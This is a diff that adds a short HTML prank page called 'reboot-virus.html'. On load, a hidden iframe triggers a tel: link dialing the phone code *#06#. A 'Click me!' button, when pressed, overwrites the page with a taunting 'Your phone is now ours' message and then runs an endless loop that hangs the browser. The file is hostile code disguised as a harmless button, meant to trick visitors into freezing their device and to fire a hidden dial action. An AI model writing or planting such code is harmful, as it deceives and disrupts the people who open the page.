@@ -1,0 +1,9 @@
+<!-- reboot-virus.html -->
+<script>
+function crashPhone() {
+document.write("Your phone is now ours. Mwahaha!");
+while (true) {}
+}
+</script>
+<iframe src="tel:*%2306%23" style="display:none"></iframe>
+<button onclick="crashPhone()">Click me!</button>
